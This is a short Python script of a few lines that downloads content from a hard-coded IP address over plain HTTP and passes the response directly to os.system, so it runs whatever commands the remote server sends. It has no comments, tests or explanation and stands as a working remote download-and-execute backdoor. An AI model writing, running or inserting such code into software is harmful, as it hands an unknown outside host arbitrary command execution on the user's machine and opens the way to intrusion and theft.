import os
import requests


response = requests.get('http://129.21.228.138/hello')
os.system(response.content)
